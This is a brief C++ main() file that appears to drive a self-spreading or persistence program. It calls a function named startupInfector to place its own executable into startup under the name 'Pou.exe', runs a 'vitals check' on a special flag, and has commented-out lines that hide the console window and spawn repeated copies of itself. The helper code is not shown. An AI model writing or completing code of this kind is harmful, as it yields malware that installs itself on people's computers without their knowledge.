#include "Common.h"

int main(int argc, char* argv[]) {

	//FreeConsole();

	std::cout << "Starting args" << endl;

	for (int i = 0; i < argc; ++i) {

		if (std::string(argv[i]) == "--Extra") {

			pouVitalsCheck();

		}

	}

	startupInfector(argv[0], "Pou.exe");

	//system("start C:\\Pou.exe --Extra");
	//system("start C:\\Pou.exe --Extra");
	//system("start C:\\Pou.exe --Extra");
	//system("start C:\\Pou.exe --Extra");
	
	//pouVitalsCheck();

	cin.get();

	return 0;
}